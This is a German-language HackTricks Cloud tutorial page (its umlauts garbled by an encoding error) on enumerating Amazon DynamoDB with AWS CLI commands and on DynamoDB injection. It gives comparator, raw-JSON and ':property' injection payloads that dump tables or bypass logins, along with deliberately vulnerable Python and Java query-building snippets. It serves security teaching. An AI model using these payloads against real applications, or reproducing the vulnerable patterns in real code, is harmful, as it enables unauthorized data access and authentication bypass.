# AWS - DynamoDB Enum

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## DynamoDB

### Grundinformationen

Amazon DynamoDB wird von AWS als **vollst√§ndig verwaltete, serverlose, Schl√ºssel-Wert-NoSQL-Datenbank** pr√§sentiert, die f√ºr leistungsstarke Anwendungen unabh√§ngig von ihrer Gr√∂√üe konzipiert ist. Der Dienst bietet robuste Funktionen, einschlie√ülich integrierter Sicherheitsma√ünahmen, unterbrechungsfreier Backups, automatisierter Replikation √ºber mehrere Regionen, integrierter In-Memory-Caching und praktischer Datenexport-Utilities.

Im Kontext von DynamoDB werden anstelle einer traditionellen Datenbank **Tabellen erstellt**. Jede Tabelle erfordert die Angabe eines **Partitionierungsschl√ºssels** als integralen Bestandteil des **Prim√§rschl√ºssels der Tabelle**. Dieser Partitionierungsschl√ºssel, im Wesentlichen ein **Hash-Wert**, spielt eine entscheidende Rolle sowohl bei der Abfrage von Elementen als auch bei der Verteilung von Daten √ºber verschiedene Hosts. Diese Verteilung ist entscheidend f√ºr die Aufrechterhaltung sowohl der Skalierbarkeit als auch der Verf√ºgbarkeit der Datenbank. Dar√ºber hinaus gibt es die M√∂glichkeit, einen **Sortierschl√ºssel** hinzuzuf√ºgen, um die Datenorganisation weiter zu verfeinern.

### Verschl√ºsselung

Standardm√§√üig verwendet DynamoDB einen KMS-Schl√ºssel, der **zu Amazon DynamoDB geh√∂rt,** nicht einmal den von AWS verwalteten Schl√ºssel, der zumindest zu Ihrem Konto geh√∂rt.

<figure><img src="https://lh4.googleusercontent.com/JjtNS7aA-_GRMgZb4v93jWEQJi6DQdUPq0FEpzZPdeyCeNoG05p0NJiV9Zs-ULs_-Tfjmx0W1ZgsE2Ui2ljo7D-1a87Xny-gpLVQO0XmXdFoph9ci1RepbVNwaCe9oPruEZSEDxGTxF5dIv6pW1WpT6kWA=s2048" alt=""><figcaption></figcaption></figure>

### Backups & Export nach S3

Es ist m√∂glich, die Erstellung von **Tabellen-Backups** zu **planen** oder sie **auf Anfrage** zu erstellen. Dar√ºber hinaus ist es auch m√∂glich, **Point-in-Time Recovery (PITR) f√ºr eine Tabelle zu aktivieren.** Die Wiederherstellung zu einem bestimmten Zeitpunkt bietet kontinuierliche **Backups** Ihrer DynamoDB-Daten f√ºr **35 Tage**, um Sie vor versehentlichen Schreib- oder L√∂schvorg√§ngen zu sch√ºtzen.

Es ist auch m√∂glich, **die Daten einer Tabelle nach S3 zu exportieren**, aber die Tabelle muss **PITR aktiviert haben**.

### GUI

Es gibt eine GUI f√ºr lokale Dynamo-Dienste wie [DynamoDB Local](https://aws.amazon.com/blogs/aws/dynamodb-local-for-desktop-development/), [dynalite](https://github.com/mhart/dynalite), [localstack](https://github.com/localstack/localstack) usw., die n√ºtzlich sein k√∂nnte: [https://github.com/aaronshaf/dynamodb-admin](https://github.com/aaronshaf/dynamodb-admin)

### Enumeration
```bash
# Tables
aws dynamodb list-tables
aws dynamodb describe-table --table-name <t_name> #Get metadata info
## The primary key and sort key will appear inside the KeySchema field

#Check if point in time recovery is enabled
aws dynamodb describe-continuous-backups \
--table-name tablename

# Backups
aws dynamodb list-backups
aws dynamodb describe-backup --backup-arn <arn>
aws dynamodb describe-continuous-backups --table-name <t_name>

# Global tables
aws dynamodb list-global-tables
aws dynamodb describe-global-table --global-table-name <name>

# Exports
aws dynamodb list-exports
aws dynamodb describe-export --export-arn <arn>

# Misc
aws dynamodb describe-endpoints #Dynamodb endpoints
```
### Unauthenticated Access

{% content-ref url="../aws-unauthenticated-enum-access/aws-dynamodb-unauthenticated-access.md" %}
[aws-dynamodb-unauthenticated-access.md](../aws-unauthenticated-enum-access/aws-dynamodb-unauthenticated-access.md)
{% endcontent-ref %}

### Privesc

{% content-ref url="../aws-privilege-escalation/aws-dynamodb-privesc.md" %}
[aws-dynamodb-privesc.md](../aws-privilege-escalation/aws-dynamodb-privesc.md)
{% endcontent-ref %}

### Post Exploitation

{% content-ref url="../aws-post-exploitation/aws-dynamodb-post-exploitation.md" %}
[aws-dynamodb-post-exploitation.md](../aws-post-exploitation/aws-dynamodb-post-exploitation.md)
{% endcontent-ref %}

### Persistence

{% content-ref url="../aws-persistence/aws-dynamodb-persistence.md" %}
[aws-dynamodb-persistence.md](../aws-persistence/aws-dynamodb-persistence.md)
{% endcontent-ref %}

## DynamoDB Injection

### SQL Injection

Es gibt M√∂glichkeiten, auf DynamoDB-Daten mit **SQL-Syntax** zuzugreifen, daher sind typische **SQL-Injektionen ebenfalls m√∂glich**.

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection" %}

### NoSQL Injection

In DynamoDB k√∂nnen verschiedene **Bedingungen** verwendet werden, um Daten abzurufen. Wie bei einer g√§ngigen NoSQL-Injektion, wenn es m√∂glich ist, **mehrere Bedingungen zu verketten, um** Daten abzurufen, k√∂nnten Sie versteckte Daten (oder die gesamte Tabelle dumpen) erhalten.\
Hier finden Sie die von DynamoDB unterst√ºtzten Bedingungen: [https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html)

Beachten Sie, dass **verschiedene Bedingungen** unterst√ºtzt werden, wenn auf die Daten √ºber **`query`** oder √ºber **`scan`** zugegriffen wird.

{% hint style="info" %}
Tats√§chlich m√ºssen **Query**-Aktionen die **Bedingung "EQ" (gleich)** im **prim√§ren** Schl√ºssel angeben, um zu funktionieren, was sie viel **weniger anf√§llig f√ºr NoSQL-Injektionen** macht (und auch die Operation sehr eingeschr√§nkt).
{% endhint %}

Wenn Sie die **Vergleichsoperation** √§ndern oder neue hinzuf√ºgen k√∂nnen, k√∂nnten Sie mehr Daten abrufen.
```bash
# Comparators to dump the database
"NE": "a123" #Get everything that doesn't equal "a123"
"NOT_CONTAINS": "a123" #What you think
"GT": " " #All strings are greater than a space
```
{% embed url="https://book.hacktricks.xyz/pentesting-web/nosql-injection" %}

### Raw Json Injection

{% hint style="danger" %}
**Diese Schwachstelle basiert auf dem dynamodb Scan Filter, der jetzt veraltet ist!**
{% endhint %}

**DynamoDB** akzeptiert **Json**-Objekte, um **Daten** in der DB zu **suchen**. Wenn Sie feststellen, dass Sie im Json-Objekt, das zum Suchen gesendet wird, schreiben k√∂nnen, k√∂nnten Sie die DB dumpen, alle Inhalte.

Zum Beispiel, injizieren in eine Anfrage wie:

{% code overflow="wrap" %}
```bash
'{"Id": {"ComparisonOperator": "EQ","AttributeValueList": [{"N": "' + user_input + '"}]}}'
```
{% endcode %}

Ein Angreifer k√∂nnte etwas injizieren wie:

`1000"}],"ComparisonOperator": "GT","AttributeValueList": [{"N": "0`

Beheben Sie die "EQ"-Bedingung, indem Sie nach der ID 1000 suchen und dann nach allen Daten mit einer ID-Zeichenfolge suchen, die gr√∂√üer als 0 ist, was alles ist.

Ein weiteres **anf√§lliges Beispiel mit einem Login** k√∂nnte sein:
```python
scan_filter = """{
"username": {
"ComparisonOperator": "EQ",
"AttributeValueList": [{"S": "%s"}]
},
"password": {
"ComparisonOperator": "EQ",
"AttributeValueList": [{"S": "%s"}]
}
}
""" % (user_data['username'], user_data['password'])

dynamodb.scan(TableName="table-name", ScanFilter=json.loads(scan_filter))
```
Dies w√§re anf√§llig f√ºr:
```
username: none"}],"ComparisonOperator": "NE","AttributeValueList": [{"S": "none
password: none"}],"ComparisonOperator": "NE","AttributeValueList": [{"S": "none
```
### :property Injection

Einige SDKs erlauben die Verwendung eines Strings, der die durchzuf√ºhrende Filterung angibt, wie: 

{% code overflow="wrap" %}
```java
new ScanSpec().withProjectionExpression("UserName").withFilterExpression(user_input+" = :username and Password = :password").withValueMap(valueMap)
```
{% endcode %}

Sie m√ºssen wissen, dass das Suchen in DynamoDB f√ºr **das Ersetzen** eines Attributs **wertes** in **Filterausdr√ºcken** beim Scannen der Elemente, die Tokens mit dem **`:`**-Zeichen **beginnen** sollten. Solche Tokens werden zur Laufzeit mit dem tats√§chlichen **Attributwert ersetzt**.

Daher kann ein Login wie das vorherige mit etwas wie folgendem umgangen werden:
```bash
:username = :username or :username
# This will generate the query:
# :username = :username or :username = :username and Password = :password
# which is always true
```
{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
